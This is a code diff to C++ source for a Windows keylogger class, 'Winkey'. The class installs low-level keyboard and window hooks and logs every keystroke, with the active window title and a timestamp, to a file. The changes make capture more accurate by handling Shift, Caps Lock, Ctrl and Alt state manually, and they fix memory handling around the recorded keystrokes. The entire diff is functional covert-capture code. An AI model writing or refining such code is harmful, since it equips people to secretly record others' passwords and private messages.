@@ -3,7 +3,7 @@
 std::wofstream	Winkey::_logFile;
 wchar_t			Winkey::_windowTitle[256];
 HWND		    Winkey::_currentWindow;
-wchar_t			*Winkey::_keyStroke;
+std::wstring	Winkey::_keyStroke;
 
 Winkey::Winkey(): _logFileName(TW_LOGFILE) {
     // Prevent multiple instances of this program
@@ -13,8 +13,7 @@ Winkey::Winkey(): _logFileName(TW_LOGFILE) {
 
     // Open the outfile in appending mode
     _logFile.open(TW_LOGFILE, std::ios::app);
-    if (!_logFile.is_open())
-        throw FileOpenFailureException();
+    if (!_logFile.is_open()) throw FileOpenFailureException();
 
     // Set window and keyboard hooks
     try { setHooks(); } catch (HookSettingFailureException &e) {
@@ -62,7 +61,7 @@ void Winkey::logToFile() {
         if (_windowTitle && localtime_s(&localTime, &now) == 0) {
             // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
             // `L` is for wide characters (Unicode)
-            _logFile << L"\n[" << std::setfill(L'0')
+            _logFile << L"\n\n[" << std::setfill(L'0')
                     << std::setw(2) << localTime.tm_mday << L"."
                     << std::setw(2) << (localTime.tm_mon + 1) << L"."
                     << (localTime.tm_year + 1900) << L" "
@@ -144,11 +143,34 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
 
         LastVkCode = p->vkCode;
 
-        BYTE    keyboardState[256];
-        WCHAR   buffer[5] = {};
+        BYTE            keyboardState[256];
+        std::wstring    buffer(5, L'\0');
 
-        // Get the current state of all keys
+        /*
+         * Get the current state of all keys
+         *
+         * GetKeyboardState() retrieves the keyboard state for the calling thread,
+         *  not the one generating the event. 
+         * 
+         * This is why we need to manually update the state of modifier keys
+         *  (like Shift, Ctrl, Alt) if we want, for instance, the characters to be
+         *  uppercase when Shift is hold.
+         */
+
         GetKeyboardState(keyboardState);
+
+        // Set modifier keys manually
+        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
+            keyboardState[VK_SHIFT] |= 0x80;
+        if (GetKeyState(VK_CAPITAL) & 0x0001) // toggle bit, not pressed
+            keyboardState[VK_CAPITAL] |= 0x01;
+        else
+            keyboardState[VK_CAPITAL] &= ~0x01; // Clear the toggle state if not toggled
+        if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
+            keyboardState[VK_CONTROL] |= 0x80;
+        if (GetAsyncKeyState(VK_MENU) & 0x8000) // Alt key
+            keyboardState[VK_MENU] |= 0x80;
+
         // Gets the input language layout of the current thread
         const HKL layout = GetKeyboardLayout(0);
         
@@ -168,9 +190,10 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          */
 
         int result = ToUnicodeEx(
-            p->vkCode, p->scanCode, keyboardState, buffer, 4, 0, layout
+            p->vkCode, p->scanCode, keyboardState,
+            &buffer[0], (int)buffer.size(),
+            0, layout
         );
-        buffer[result] = L'\0'; // Null-terminate
 
         /* 
          * Log character to file or, if no valid character was produced
@@ -178,8 +201,10 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  the virtual key code.
          */
 
-        if (result > 0) _keyStroke = buffer;
-        else _keyStroke = (wchar_t *)getKeyName(p->vkCode).c_str();
+        if (result > 0)
+            _keyStroke = buffer;
+        else
+            _keyStroke = getKeyName(p->vkCode);
 
         logToFile();
     }
